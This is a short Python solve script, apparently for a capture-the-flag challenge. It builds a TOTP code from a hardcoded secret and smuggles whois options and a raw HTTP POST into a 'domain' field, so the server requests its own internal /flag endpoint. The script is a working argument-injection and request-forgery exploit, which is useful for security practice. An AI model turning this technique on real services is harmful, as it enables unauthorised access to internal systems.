
import base64, hmac, hashlib, struct, time, re, html, subprocess

URL = "http://chal.thjcc.org:13316/whois"
SECRET = "R66M4XK7OKRIGMWWACPGSH5SAEEWPYOZ"

def totp_now(secret_b32, step=30, digits=6):
    key = base64.b32decode(secret_b32, casefold=True)
    counter = int(time.time()) // step
    msg = struct.pack(">Q", counter)
    digest = hmac.new(key, msg, hashlib.sha1).digest()
    off = digest[-1] & 0x0F
    code = (struct.unpack(">I", digest[off:off+4])[0] & 0x7FFFFFFF) % (10 ** digits)
    return f"{code:0{digits}d}"

code = totp_now(SECRET)
req = (
    "POST /flag HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "admin: thjcc\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 14\r\n"
    "\r\n"
    f"safekey={code}"
)

payload = f"-h 127.0.0.1 -p 13316 '{req}'"
cmd = [
    "curl.exe", "-sS", URL,
    "-H", "Content-Type: application/x-www-form-urlencoded",
    "--data-urlencode", f"domain={payload}",
]
resp = subprocess.check_output(cmd)
text = resp.decode("utf-8", errors="ignore")
m = re.search(r"<pre>([\\s\\S]*?)</pre>", text)
print(html.unescape(m.group(1) if m else text))